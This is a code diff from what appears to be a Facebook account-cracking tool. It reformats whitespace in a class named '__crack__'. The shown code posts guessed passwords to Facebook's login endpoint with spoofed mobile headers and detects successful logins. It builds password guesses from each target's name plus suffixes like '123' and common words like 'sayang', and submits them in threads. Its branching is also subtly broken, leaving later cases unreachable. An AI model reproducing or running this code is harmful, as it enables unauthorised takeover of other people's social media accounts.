@@ -700,13 +700,7 @@ class __crack__:
             try: os.mkdir('results')
             except: pass
             user_agent = 'Mozilla/5.0 (Linux; Android 10; Nokia C5 Endi) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36 OPR/60.3.3004.55692'
-            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
-               'x-fb-net-hni': str(random.randint(20000, 40000)), 
-               'x-fb-connection-quality': 'EXCELLENT', 
-               'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
-               'user-agent': user_agent, 
-               'content-type': 'application/x-www-form-urlencoded', 
-               'x-fb-http-engine': 'Liger'}
+            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': user_agent, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
             aw = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'}, headers=headers_)
             xo = aw.content
             if 'mbasic_logout_button' in xo or 'save-device' in xo:
@@ -743,13 +737,7 @@ class __crack__:
             try: os.mkdir('results')
             except: pass
             user_agent = 'Mozilla/5.0 (Linux; Android 10; Nokia C5 Endi) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36 OPR/60.3.3004.55692'
-            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
-               'x-fb-net-hni': str(random.randint(20000, 40000)), 
-               'x-fb-connection-quality': 'EXCELLENT', 
-               'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
-               'user-agent': user_agent, 
-               'content-type': 'application/x-www-form-urlencoded', 
-               'x-fb-http-engine': 'Liger'}
+            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': user_agent, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
             ses = requests.Session()
             ses.get('https://m.facebook.com/')
             ses.headers.update(headers=headers_)
@@ -795,22 +783,22 @@ class __crack__:
                         xz = bb[1].split(' ')
                         if len(xz) == 1 or len(xz) == 2 or len(xz) == 3 or len(xz) == 4 or len(xz) == 5:
                             	raimuuu = [
-                        		xz[0], xz[0]+'123', xz[0]+'12345',
+                        		xz[0], xz[0]+'123', xz[0]+'12345', 
                         		xz[1], xz[1]+'123', xz[1]+'12345',
                         	]
                         elif len(xz) == 3:
                         	raimuuu = [
-                        		xz[0], xz[0]+'123', xz[0]+'12345',
-                        		xz[1], xz[1]+'123', xz[1]+'12345',
-                        		xz[2], xz[2]+'123', xz[2]+'12345',
+                        		xz[0], xz[0]+'123', xz[0]+'12345', 
+                        		xz[1], xz[1]+'123', xz[1]+'12345', 
+                        		xz[2], xz[2]+'123', xz[2]+'12345', 
 					'sayang',
                         	]
                         elif len(xz) == 4:
                         	raimuuu = [
-                        		xz[0], xz[0]+'123', xz[0]+'12345',
-                        		xz[1], xz[1]+'123', xz[1]+'12345',
-                        		xz[2], xz[2]+'123', xz[2]+'12345',
-                        		xz[3], xz[3]+'123', xz[3]+'12345',
+                        		xz[0], xz[0]+'123', xz[0]+'12345', 
+                        		xz[1], xz[1]+'123', xz[1]+'12345', 
+                        		xz[2], xz[2]+'123', xz[2]+'12345', 
+                        		xz[3], xz[3]+'123', xz[3]+'12345', 
 					'sayang', 'bismillah',
                         	]
                         __yayanXD__.submit(self.__api__, bb[0], raimuuu)
